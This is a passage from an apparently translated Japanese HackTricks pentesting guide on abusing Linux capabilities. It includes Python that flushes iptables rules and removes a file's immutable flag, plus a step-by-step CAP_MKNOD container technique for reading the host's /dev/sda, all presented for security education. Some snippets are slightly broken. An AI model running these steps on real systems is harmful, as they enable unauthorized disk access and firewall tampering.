tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP\_NET\_ADMIN + CAP\_NET\_RAW

[**CAP\_NET\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html)は、能力所有者に対して、公開されたネットワーク名前空間のファイアウォール、ルーティングテーブル、ソケットの許可、ネットワークインターフェースの設定など、関連する設定を変更する機能を提供します。これにより、接続されたネットワークインターフェースのプロミスキャスモードを有効にすることも可能であり、名前空間を横断してスニッフィングする可能性があります。

**バイナリの例**

例えば、**pythonバイナリ**がこれらの機能を持っているとします。
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP_LINUX_IMMUTABLE

**これは、inode属性を変更することが可能であることを意味します。** この機能を直接使用して特権をエスカレーションすることはできません。

**バイナリを使用した例**

もし、ファイルがimmutableであり、pythonがこの機能を持っている場合、**immutable属性を削除し、ファイルを変更可能にすることができます:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
{% hint style="info" %}
通常、この不変の属性は以下のように設定および削除されます。
```bash
sudo chattr +i file.txt
sudo chattr -i file.txt
```
{% endhint %}

## CAP\_SYS\_CHROOT

[**CAP\_SYS\_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html)は`chroot(2)`システムコールの使用を許可します。これにより、既知の弱点と脱出方法を使用して、任意の`chroot(2)`環境から脱出することができます。

* [さまざまなchrootソリューションからの脱出方法](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf)
* [chw00t: chroot脱出ツール](https://github.com/earthquake/chw00t/)

## CAP\_SYS\_BOOT

[**CAP\_SYS\_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html)は`reboot(2)`システムコールの使用を許可します。また、特定のハードウェアプラットフォームに実装された`LINUX_REBOOT_CMD_RESTART2`を介して任意の**再起動コマンド**を実行することも可能です。

この機能は、新しいクラッシュカーネルをロードする`kexec_load(2)`システムコールの使用も許可します。また、Linux 3.17以降では、署名されたカーネルをロードする`kexec_file_load(2)`も使用できます。

## CAP\_SYSLOG

[CAP\_SYSLOG](https://man7.org/linux/man-pages/man7/capabilities.7.html)は、Linux 2.6.37で`CAP_SYS_ADMIN`のキャッチオールから分岐されました。この機能により、プロセスは`syslog(2)`システムコールを使用することができます。これにより、`/proc/sys/kernel/kptr_restrict`が1に設定されている場合、プロセスは`/proc`およびその他のインターフェースを介して公開されるカーネルアドレスを表示することもできます。

`kptr_restrict` sysctl設定は2.6.38で導入され、カーネルアドレスが公開されるかどうかを決定します。これは2.6.39以降、バニラカーネル内ではゼロ（カーネルアドレスの公開）がデフォルトですが、多くのディストリビューションでは値が1（uid 0以外のすべてのユーザーから非表示）または2（常に非表示）に正しく設定されています。

さらに、この機能により、`dmesg_restrict`設定が1の場合、プロセスは`dmesg`の出力を表示することもできます。最後に、`CAP_SYS_ADMIN`機能は、歴史的な理由から自体が`syslog`操作を実行することが許可されています。

## CAP\_MKNOD

[CAP\_MKNOD](https://man7.org/linux/man-pages/man7/capabilities.7.html)は、[mknod](https://man7.org/linux/man-pages/man2/mknod.2.html)の拡張使用を許可することにより、通常のファイル（`S_IFREG`）、FIFO（名前付きパイプ）（`S_IFIFO`）、またはUNIXドメインソケット（`S_IFSOCK`）以外のものを作成することができます。特殊ファイルは次のとおりです。

* `S_IFCHR`（キャラクタ特殊ファイル（端末などのデバイス））
* `S_IFBLK`（ブロック特殊ファイル（ディスクなどのデバイス））。

これはデフォルトの機能です（[https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)）。

この機能により、ホスト上で特権エスカレーション（完全なディスク読み取りを介して）を行うことができます。以下の条件を満たす必要があります。

1. ホストに初期アクセス（非特権）を持つこと。
2. コンテナに初期アクセス（特権（EUID 0）および有効な`CAP_MKNOD`）を持つこと。
3. ホストとコンテナは同じユーザーネームスペースを共有する必要があります。

**手順：**

1. 標準ユーザーとしてホストで次の操作を行います：
   1. 現在のUIDを取得します（`id`）。例：`uid=1000(unprivileged)`。
   2. 読み取りたいデバイスを取得します。例：`/dev/sda`
2. `root`としてコンテナで次の操作を行います：
```bash
# Create a new block special file matching the host device
mknod /dev/sda b
# Configure the permissions
chmod ug+w /dev/sda
# Create the same standard user than the one on host
useradd -u 1000 unprivileged
# Login with that user
su unprivileged
```
1. ホストに戻る:
```bash
# Find the PID linked to the container owns by the user "unprivileged"
# Example only (Depends on the shell program, etc.). Here: PID=18802.
$ ps aux | grep -i /bin/sh | grep -i unprivileged
unprivileged        18802  0.0  0.0   1712     4 pts/0    S+   15:27   0:00 /bin/sh
```

```bash
# Because of user namespace sharing, the unprivileged user have access to the container filesystem, and so the created block special file pointing on /dev/sda
head /proc/18802/root/dev/sda
```
攻撃者は、特権のないユーザーからデバイス/dev/sdaを読み取り、ダンプし、コピーすることができます。

### CAP\_SETPCAP

**`CAP_SETPCAP`**は、Linuxの機能であり、プロセスが他のプロセスの機能セットを変更することを可能にします。これにより、他のプロセスの有効、継承可能、許可された機能セットに対して機能を追加または削除することができます。ただし、この機能は使用方法に制限があります。

`CAP_SETPCAP`を持つプロセスは、**自分自身の許可された機能セットにある機能のみを付与または削除することができます**。言い換えると、プロセスは自分自身が持っていない機能を他のプロセスに付与することはできません。この制限により、プロセスは自身の特権レベルを超えて他のプロセスの特権を昇格させることができなくなります。

さらに、最近のカーネルバージョンでは、`CAP_SETPCAP`機能が**さらに制限されています**。これにより、プロセスは他のプロセスの機能セットを任意に変更することはできなくなりました。代わりに、自身の許可された機能セットまたは子孫の許可された機能セットの機能のみを低下させることができます。この変更は、機能に関連する潜在的なセキュリティリスクを減らすために導入されました。

`CAP_SETPCAP`を効果的に使用するには、自身の有効な機能セットに機能を持ち、対象の機能を許可された機能セットに持っている必要があります。その後、`capset()`システムコールを使用して他のプロセスの機能セットを変更することができます。

要約すると、`CAP_SETPCAP`は他のプロセスの機能セットを変更することができますが、自身が持っていない機能を付与することはできません。また、セキュリティ上の懸念から、最近のカーネルバージョンでは、自身の許可された機能セットまたは子孫の許可された機能セットの機能のみを低下させることができるように機能が制限されています。

## 参考文献

**これらの例のほとんどは、**[**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com)**のラボから取得されました。したがって、この特権昇格技術を練習したい場合は、これらのラボをお勧めします。

**その他の参考文献**：

* [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
* [https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/)
* [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
* [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module)
* [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/)は、**スペイン**で最も関連性の高いサイバーセキュリティイベントであり、**ヨーロッパ**でも最も重要なイベントの一つです。技術的な知識を促進することを使命としており、あらゆる分野の技術とサイバーセキュリティの専門家が集まる活気ある場です。

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？ HackTricksで会社を宣伝したいですか？または、最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロードしたりしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！**
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)をご覧ください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**

</details>
